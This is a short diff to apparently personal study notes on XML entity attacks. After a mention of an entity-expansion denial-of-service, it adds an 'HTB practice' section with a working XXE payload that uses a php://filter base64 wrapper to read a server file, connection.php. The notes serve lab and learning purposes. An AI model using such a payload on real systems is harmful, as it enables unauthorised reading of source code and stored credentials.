@@ -66,6 +66,19 @@ This payload defines the a0 entity as DOS, references it in a1 multiple times, r
 and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache),  
 as they protect against entity self-reference
 
+## HTB practice
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php"> ]>
+<root>
+<name>nn</name>
+<tel></tel>
+<email>&company;</email>
+<message>n</message>
+</root>
+```
+
 
 ---
 
